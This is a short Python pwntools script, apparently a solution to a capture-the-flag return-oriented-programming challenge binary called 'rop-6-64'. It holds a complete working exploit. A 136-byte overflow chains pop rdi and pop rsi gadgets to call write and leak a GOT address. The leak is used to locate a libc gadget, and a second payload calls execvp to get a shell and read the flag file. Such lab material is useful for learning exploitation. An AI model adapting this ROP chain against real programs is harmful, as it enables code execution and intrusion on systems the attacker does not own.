from pwn import *
p = process("./rop-6-64")

read = p64(0x4004b0)
write = p64(0x4004a0)
got = p64(0x601018)

inp = p64(0x40062c)
#inp = p64(0x0000000000400661)

poprdi = p64(0x0000000000400703) #: pop rdi ; ret
poprsi = p64(0x0000000000400701) #: pop rsi ; pop r15 ; ret
zero = p64(0x60086c)


#read read_got
#write read_got
#return to input
execvp = p64(0x4004d0)


pay = "A"* 136 + poprdi + p64(0x1) + poprsi + got * 2 + write + inp
p.sendline(pay)
p.recvline(timeout = 5)
x = p.recv(timeout = 5)
x = x[1:9]
print len(x)
print repr(x)
read_addr = u64(x)
poprdx = p64(read_addr - 0xf571e)

pay2 = "A" *136 + poprdi + zero + poprsi + p64(0x0)*2 + poprdx + p64(0x0) + execvp
p.sendline(pay2)
p.sendline("cat flag")
print p.recv(timeout = 5)
